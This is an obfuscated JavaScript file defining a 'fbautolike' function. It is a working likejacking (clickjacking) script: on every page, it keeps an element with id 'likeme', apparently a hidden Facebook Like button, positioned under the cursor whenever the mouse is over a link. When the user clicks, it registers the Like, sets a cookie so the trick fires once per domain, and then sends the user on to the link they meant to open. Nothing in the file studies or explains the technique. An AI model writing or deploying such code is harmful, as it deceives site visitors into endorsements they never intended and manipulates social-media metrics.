function fbautolike() {
    window['yestheylikeme'] = 1;
    var cx2 = jQuery['noConflict']();

    function cx3(cx4) {
        var cx5 = 0;
        var cx6;
        cx2('*', cx4)['each'](function () {
            if (cx2(this)['outerHeight'](true) > cx5) {
                cx6 = cx2(this);
                cx5 = cx6['outerHeight'](true);
            };
        });
        if (cx4['outerHeight'](true) > cx5) {
            cx5 = cx4['outerHeight'](true);
        };
        return cx5 + 3;
    };

    function cx7(cx4) {
        var cx5 = cx4['offset']()['top'];
        var cx6;
        cx2('*', cx4)['each'](function () {
            if (cx2(this)['offset']()['top'] < cx5) {
                cx6 = cx2(this);
                cx5 = cx6['offset']()['top'];
            };
        });
        if (cx4['offset']()['top'] < cx5) {
            cx5 = cx4['offset']()['top'];
        };
        return cx5 + 3;
    };
    cx2(document)['ready'](function () {
        var cx8 = 0;
        var cx9 = 0;
        var cxa = '';
        var cxb = 0;
        




        
        window['yestheylikeme'] = 1;
        if (cx2['cookie']('theylikeme_' + escape(document['domain'])) == 1) {
            cxb = 1;
            window['yestheylikeme'] = 0;
        };
        if (window['yestheylikeme']) {
            FB['Event']['subscribe']('edge.create', function (cxc) {
                cx2('#likeme')['css']('display', 'none');
                cxb = 1;
                cx2['cookie']('theylikeme_' + escape(document['domain']), '1');
                window['location']['href'] = cxa['attr']('href');
            });
            cx2(document)['mousemove'](function (cxd) {
                if (cxa != '') {
                    if (cxd['pageY'] < (cx7(cxa) - 4) || cxd['pageY'] > (cx7(cxa) + cx3(cxa)) || cxd['pageX'] < cxa['offset']()['left'] || cxd['pageX'] > (cxa['offset']()['left'] + cxa['width']())) {
                        cxa = '';
                        cx2('#likeme')['css']('display', 'none');
                    } else {
                        if (cx2['browser']['msie']) {
                            cx2('#likeme')['css']('top', (cxd['pageY'] - 15) + 'px');
                            cx2('#likeme')['css']('left', (cxd['pageX'] - 20) + 'px');
                        } else {
                            cx2('#likeme')['css']('top', (cxd['pageY'] - 5) + 'px');
                            cx2('#likeme')['css']('left', (cxd['pageX'] - 20) + 'px');
                        };
                    };
                };
            });
            cx2(document)['delegate']('a', 'mouseenter', function () {
                if (cxb == 0) {
                    cxa = cx2(this);
                    cx2('#likeme')['css']('display', 'block');
                };
            });
        };
    });
    jQuery['cookie'] = function (cxe, cxf, cx10) {
        if (typeof cxf != 'undefined') {
            cx10 = cx10 || {};
            if (cxf === null) {
                cxf = '';
                cx10['expires'] = -1;
            };
            var cx11 = '';
            if (cx10['expires'] && (typeof cx10['expires'] == 'number' || cx10['expires']['toUTCString'])) {
                var cx12;
                if (typeof cx10['expires'] == 'number') {
                    cx12 = new Date();
                    cx12['setTime'](cx12['getTime']() + (cx10['expires'] * 24 * 60 * 60 * 1000));
                } else {
                    cx12 = cx10['expires'];
                };
                cx11 = '; expires=' + cx12['toUTCString']();
            };
            var cx13 = cx10['path'] ? '; path=' + (cx10['path']) : '';
            var cx14 = cx10['domain'] ? '; domain=' + (cx10['domain']) : '';
            var cx15 = cx10['secure'] ? '; secure' : '';
            document['cookie'] = [cxe, '=', encodeURIComponent(cxf), cx11, cx13, cx14, cx15]['join']('');
        } else {
            var cx16 = null;
            if (document['cookie'] && document['cookie'] != '') {
                var cx17 = document['cookie']['split'](';');
                for (var cx18 = 0; cx18 < cx17['length']; cx18++) {
                    var cx19 = jQuery['trim'](cx17[cx18]);
                    if (cx19['substring'](0, cxe['length'] + 1) == (cxe + '=')) {
                        cx16 = decodeURIComponent(cx19['substring'](cxe['length'] + 1));
                        break;
                    };
                };
            };
            return cx16;
        };
    };
};